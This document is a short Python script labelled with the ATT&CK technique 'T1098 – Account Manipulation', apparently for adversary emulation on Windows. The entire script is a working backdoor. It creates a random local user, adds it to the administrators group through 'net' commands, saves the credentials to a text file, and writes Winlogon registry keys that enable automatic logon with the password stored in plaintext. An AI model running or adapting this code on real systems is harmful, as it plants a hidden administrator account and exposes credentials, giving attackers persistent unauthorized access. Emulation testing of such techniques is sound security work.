'''
T1098 – Account Manipulation
'''

import os 
import random 
import string 
import winreg

hive = winreg.HKEY_LOCAL_MACHINE
subkey = r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'


def generate_user():
    length = 8
    characters = string.ascii_letters
    username = ''.join(random.choice(characters) for i in range(length))
    return username

def generate_password():
    length = 12
    characters = string.ascii_letters + string.digits + '!@&$%'

    while True:
        password = ''.join(random.choice(characters) for i in range (length))
        if (any(c.isupper() for c in password)) and any(c.islower() for c in password) and any(c.isdigit() for c in password) and any (c in '!@&$%' for c in password):
            return password 
        
def add_user(username, password):
    command = f'net user /add {username} {password}'
    os.system(command)

def add_to_admin(username):
    command = f'net localgroup administrators /add {username}'
    result = os.system(command)
    return result

def reg_key(hive, subkey, name, value):
    key = winreg.CreateKey(hive, subkey)
    print(f"{subkey} Opened")
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
    print(f"{name} Set with {value}")

    winreg.CloseKey(key)

def print_reg_key(hive, subkey, value_name):
    key = winreg.OpenKey(hive, subkey)
    key_value = winreg.QueryValueEx(key, value_name)
    print(f"The value for {value_name} is {key_value[0]}")

    winreg.CloseKey(key)

username = generate_user()
password = generate_password()

with open ('user.txt', 'a') as file:
    file.write(username + '\n')
    file.write(password)

add_user(username, password)
result = add_to_admin(username)
if result == 0:
    #check if user is in admin group 
    os.system('net localgroup administrators')

    #set registry keys 
    print("Setting Registry Keys")
    reg_key(hive, subkey, 'AutoAdminLogon','1')
    reg_key(hive, subkey, 'DefaultUserName', username)
    reg_key(hive, subkey,'DefaultPassword ',password)
    reg_key(hive, subkey, 'DefaultDomainName', '')

    #print values for registry keys
    print("Checking Registry Keys")
    print_reg_key(hive, subkey, 'AutoAdminLogon')
    print_reg_key(hive, subkey, 'DefaultUserName')
    print_reg_key(hive, subkey, 'DefaultPassword')
    print_reg_key(hive, subkey, 'DefaultDomainName')
else:
    print("Adding user to admin group failed. Exiting")


      